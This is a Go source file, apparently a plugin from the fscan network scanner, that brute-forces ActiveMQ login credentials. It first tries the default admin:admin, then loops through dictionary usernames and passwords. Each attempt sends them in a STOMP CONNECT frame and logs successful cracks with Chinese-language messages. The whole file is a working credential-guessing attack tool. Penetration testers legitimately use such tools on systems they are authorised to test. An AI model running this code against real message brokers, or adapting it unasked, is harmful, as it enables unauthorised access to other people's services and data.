package Plugins

import (
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"net"
	"strings"
	"time"
)

func ActiveMQScan(info *Common.HostInfo) (tmperr error) {
	if Common.DisableBrute {
		return
	}

	maxRetries := Common.MaxRetries

	Common.LogDebug(fmt.Sprintf("开始扫描 %v:%v", info.Host, info.Ports))
	Common.LogDebug("尝试默认账户 admin:admin")

	// 首先测试默认账户
	for retryCount := 0; retryCount < maxRetries; retryCount++ {
		if retryCount > 0 {
			Common.LogDebug(fmt.Sprintf("第%d次重试默认账户", retryCount+1))
		}

		flag, err := ActiveMQConn(info, "admin", "admin")
		if flag {
			Common.LogSuccess(fmt.Sprintf("ActiveMQ服务 %v:%v 成功爆破 用户名: admin 密码: admin",
				info.Host, info.Ports))
			return nil
		}
		if err != nil {
			Common.LogError(fmt.Sprintf("ActiveMQ服务 %v:%v 默认账户尝试失败: %v",
				info.Host, info.Ports, err))

			if retryErr := Common.CheckErrs(err); retryErr != nil {
				if retryCount == maxRetries-1 {
					return err
				}
				continue
			}
		}
		break
	}

	totalUsers := len(Common.Userdict["activemq"])
	totalPass := len(Common.Passwords)
	Common.LogDebug(fmt.Sprintf("开始尝试用户名密码组合 (总用户数: %d, 总密码数: %d)",
		totalUsers, totalPass))

	tried := 0
	total := totalUsers * totalPass

	// 遍历所有用户名密码组合
	for _, user := range Common.Userdict["activemq"] {
		for _, pass := range Common.Passwords {
			tried++
			pass = strings.Replace(pass, "{user}", user, -1)
			Common.LogDebug(fmt.Sprintf("[%d/%d] 尝试: %s:%s", tried, total, user, pass))

			// 重试循环
			for retryCount := 0; retryCount < maxRetries; retryCount++ {
				if retryCount > 0 {
					Common.LogDebug(fmt.Sprintf("第%d次重试: %s:%s", retryCount+1, user, pass))
				}

				// 执行连接测试
				done := make(chan struct {
					success bool
					err     error
				}, 1)

				go func(user, pass string) {
					flag, err := ActiveMQConn(info, user, pass)
					select {
					case done <- struct {
						success bool
						err     error
					}{flag, err}:
					default:
					}
				}(user, pass)

				// 等待结果或超时
				var err error
				select {
				case result := <-done:
					err = result.err
					if result.success {
						Common.LogSuccess(fmt.Sprintf("ActiveMQ服务 %v:%v 成功爆破 用户名: %v 密码: %v",
							info.Host, info.Ports, user, pass))
						return nil
					}
				case <-time.After(time.Duration(Common.Timeout) * time.Second):
					err = fmt.Errorf("连接超时")
				}

				if err != nil {
					errlog := fmt.Sprintf("ActiveMQ服务 %v:%v 尝试失败 用户名: %v 密码: %v 错误: %v",
						info.Host, info.Ports, user, pass, err)
					Common.LogError(errlog)

					if retryErr := Common.CheckErrs(err); retryErr != nil {
						if retryCount == maxRetries-1 {
							continue
						}
						continue
					}
				}
				break
			}
		}
	}

	Common.LogDebug(fmt.Sprintf("扫描完成，共尝试 %d 个组合", tried))
	return tmperr
}

// ActiveMQConn 统一的连接测试函数
func ActiveMQConn(info *Common.HostInfo, user string, pass string) (bool, error) {
	timeout := time.Duration(Common.Timeout) * time.Second
	addr := fmt.Sprintf("%s:%s", info.Host, info.Ports)

	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false, err
	}
	defer conn.Close()

	// STOMP协议的CONNECT命令
	stompConnect := fmt.Sprintf("CONNECT\naccept-version:1.0,1.1,1.2\nhost:/\nlogin:%s\npasscode:%s\n\n\x00", user, pass)

	// 发送认证请求
	conn.SetWriteDeadline(time.Now().Add(timeout))
	if _, err := conn.Write([]byte(stompConnect)); err != nil {
		return false, err
	}

	// 读取响应
	conn.SetReadDeadline(time.Now().Add(timeout))
	respBuf := make([]byte, 1024)
	n, err := conn.Read(respBuf)
	if err != nil {
		return false, err
	}

	// 检查认证结果
	response := string(respBuf[:n])

	if strings.Contains(response, "CONNECTED") {
		result := fmt.Sprintf("ActiveMQ服务 %v:%v 爆破成功 用户名: %v 密码: %v",
			info.Host, info.Ports, user, pass)
		Common.LogSuccess(result)
		return true, nil
	}

	if strings.Contains(response, "Authentication failed") ||
		strings.Contains(response, "ERROR") {
		return false, fmt.Errorf("认证失败")
	}

	return false, fmt.Errorf("未知响应: %s", response)
}
